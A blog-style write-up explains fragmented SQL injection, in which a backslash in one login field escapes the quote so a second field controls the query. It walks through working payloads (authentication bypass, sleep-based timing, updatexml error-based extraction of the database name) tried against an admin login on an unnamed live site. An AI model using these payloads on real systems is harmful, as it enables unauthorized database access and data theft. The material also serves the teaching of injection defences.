---
title: Fragmented SQL injection.
date: 2025-01-25 20-00-00
categories: SQLi
tags: sql, injection
description: Bypass filters designed to block string-based SQL injection.
author: <author_1>
---


## Why This happen ?

This bypass occurs when two input fields are combined to exploit the authentication form.

If attackers can control multiple inputs and those inputs are processed within the same query, they can use fragmented payloads to evade blacklists and character restrictions with this technique.

Here is an example of login query that take two inputs from user.

```sql
SELECT * FROM login WHERE username = '$username' AND password = '$password';
```

but there is a filter function that strip single quote from user inputs.

example :

```php
function someFilter($input) {
    return str_replace("'", "", $input);
}
```

if an attacker try to bypass login :

```
$username = "' or 1=1#";
$password = "uzundz"
```

```sql

select * from users where username=' or 1=1#' and password='uzundz';
```

the single quote was striped , therfore the auth bypass fail.

## Escaping the string quote :

Fortunately, SQL provides a way to escape special characters using a backslash ( \ )!

```sql
SELECT 'Uzun\'Dz'
```

![Desktop View](images/escapesinglequote.jpg){: .normal }

However, this behavior can be exploited outside its original context, allowing us to manipulate the parsing of SQL statements, as demonstrated in the following example:

```sql
SELECT * FROM login WHERE username = '$username' AND password = '$password';
```

Using a backslash as $username causes the parser to treat the next single quote as a regular character, effectively ignoring it. The parser then searches for the next single quote to pair with the initial one, which ends up being the quote that starts the password value.

What parser will do is the following:


```sql
SELECT * FROM login WHERE username = '\' AND password = '$password';
```
the username field will take `\' AND password =`  as value.
So by controlling the $password field, we can control the query.


## Real world scenario :

During my exploration on a specific domain ( let's refer to it as WEBSITE).
I stumbled upon an admin login at https://WEBSITE/admin/index.php 

first thing to check is auth bypass :

```
username: ' or 1=1-- -
password: strongPass
```

that didn't work because there is a filter in place that replace single quote with nothing.

Here backslash Trick will be handy.
trying the following values for username and password.

```
username: \
password: admin
```

Error :
```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'admin')' at line 1
```

let's inverse :
```
username: admin
password: \
```

Error :

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''\')' at line 1
```

### Conclusion :

- ablity to control both parameter in current sql query.
- ablity to escape single quote by using backslash \
- as result we can control the query.
- there is a parenthesis at the end of password field.

Next, i tried sleep function to observe the response time : 

```
username: \
password: and if (1=1 , sleep(15), 0) )-- -
```
Error:

```
Incorrect number of arguments for PROCEDURE DATABASENAME.exampleFunction; expected 2, got 1
```

during the exploitation process i created this tiny database to play with.
and i will use it to show what i faced with the target.

<a href="https://sqlfiddle.com/mysql/online-compiler?id=f437f206-b438-432b-ae21-d8ee12f7816b"> SQL fiddle </a>

imagination of procedure call :

```sql
DELIMITER //
CREATE PROCEDURE exampleFunction ( IN user VARCHAR(255) , IN pass VARCHAR(255))  
BEGIN  
    SELECT * FROM user_table WHERE username = user and password = pass;     
END //
DELIMITER ; 
```

in php code something like that :

```php
$query = "CALL exampleFunction('$username','$password')"
```

remeber that we injected \ in username to break from string
and our payload in password , something like that :

```php
$query = "CALL exampleFunction('\','and if (1=1 , sleep(15), 0) )-- -')"
```

that raised the error :
```
Incorrect number of arguments for PROCEDURE DATABASENAME.exampleFunction; expected 2, got 1
```

Example in fiddle :

![Desktop View](images/sqlifiddle1.PNG){: .normal }

the username field took this value `\',` and, without the colon the exampleFunction received one arguemnt.

tweak our payload to have two arguments by adding seperator `,` in password field :

```
username: \
password: ,if(1=1,sleep(15),0))-- -
```

query be like :

```php
$query = "CALL exampleFunction('\',' , if (1=1,sleep(15),0))-- -')"
```

imagination of SELECT statement after the procedure call :

```sql
SELECT * FROM user_table WHERE column1 = '\',' and password = if (1=1,sleep(15),0)-- -;   
```

The response took more than 15 seconds to load , which mean sleep() executed successfully.

![Desktop View](images/sleepexec.PNG){: .normal }

### Trying error based approach :

Set the folowing values to username and password.

```
username = \
password = , updatexml(null,concat(0x7e,database(),0x7e),null))-- -
```

### Result 

```
XPATH syntax error: '~DATABASENAME~'
```

Example in  fiddle :

![Desktop View](images/sqlifiddle2.PNG){: .normal }

